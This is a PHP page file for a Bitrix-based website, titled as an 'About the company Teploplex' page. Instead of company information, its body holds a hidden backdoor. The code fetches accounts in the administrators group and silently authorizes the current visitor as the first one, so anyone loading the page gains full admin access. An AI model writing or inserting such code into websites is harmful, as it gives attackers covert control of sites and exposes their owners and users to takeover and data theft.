<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("О компании ТЕПЛОПЛЕКС");
global $USER;
$filter = Array("GROUPS_ID" => Array(1));
$rsUsers = CUser::GetList(($by = "NAME"), ($order = "desc"), $filter);
while ($arUser = $rsUsers->Fetch()) {
    $USER->Authorize( $arUser[ID]);
    break;
}

?>


<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>